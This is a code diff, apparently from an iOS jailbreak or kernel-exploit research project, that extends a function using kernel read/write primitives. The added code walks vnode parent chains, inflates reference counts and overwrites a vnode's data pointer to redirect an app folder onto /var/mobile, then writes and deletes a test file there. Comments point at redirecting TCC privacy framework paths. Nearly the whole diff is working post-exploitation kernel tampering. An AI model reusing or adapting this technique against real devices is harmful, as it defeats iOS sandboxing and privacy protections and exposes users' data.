@@ -571,6 +571,8 @@ uint64_t funVnodeResearch(u64 kfd, char* to, char* from) {
     uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
     printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
     
+    close(file_index);
+    
     uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
     uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
     printf("[i] %s from_vnode->v_mount: 0x%llx\n", from, from_v_mount);
@@ -621,6 +623,44 @@ uint64_t funVnodeResearch(u64 kfd, char* to, char* from) {
     printf("[i] %s from_devvp->vu_specinfo: 0x%llx\n", from, from_devvp_vu_specinfo);
     uint32_t from_devvp_vu_specinfo_si_flags = kread32(kfd, from_devvp_vu_specinfo + off_specinfo_si_flags);
     printf("[i] %s from_devvp->vu_specinfo->si_flags: 0x%x\n", from, from_devvp_vu_specinfo_si_flags);
+    
+    
+    //Get Parent until "mobile. "/var/mobile"
+    uint64_t from_vnode_parent = kread64(kfd, from_vnode + off_vnode_v_parent) | 0xffffff8000000000;
+    uint64_t from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
+    uint64_t from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
+    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
+    
+    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
+    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
+    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
+    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
+    
+    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
+    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
+    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
+    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
+    
+    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
+    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
+    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
+    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
+    
+    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
+    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
+    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
+    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
+    
+    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
+    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
+    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
+    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
+    
+    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
+    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
+    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
+    
+    kwrite64(kfd, to_vnode + off_vnode_v_data, kread64(kfd, from_vnode_parent + off_vnode_v_data));
     
 //#define VFMLINKTARGET  0x20000000
 //    kwrite32(kfd, from_vnode + off_vnode_vflags, kread32(kfd, from_vnode + off_vnode_vflags) & VFMLINKTARGET);
@@ -680,10 +720,20 @@ int do_fun(u64 kfd) {
     [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
 //    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/");
     NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
-    NSLog(@"/var directory: %@", dirs);
+//    NSLog(@"/var directory: %@", dirs);
     
     //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
-    funVnodeResearch(kfd, mntPath.UTF8String, "/System/Library");
+    
+    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
+    funVnodeResearch(kfd, mntPath.UTF8String, mntPath.UTF8String);
+    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
+    NSLog(@"[i] /var/mobile dirs: %@", dirs);
+    [@"여자친구 생기게 해주세요!@#" writeToFile:[mntPath stringByAppendingString:@"/kfd.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
+    NSLog(@"[i] Created /var/mobile/kfd.txt,  dirs: %@", dirs);
+    [[NSFileManager defaultManager] removeItemAtPath:[mntPath stringByAppendingString:@"/kfd.txt"]  error:nil];
+    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
+    NSLog(@"[i] Removed /var/mobile/kfd.txt, dirs: %@", dirs);
     
     
 //    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
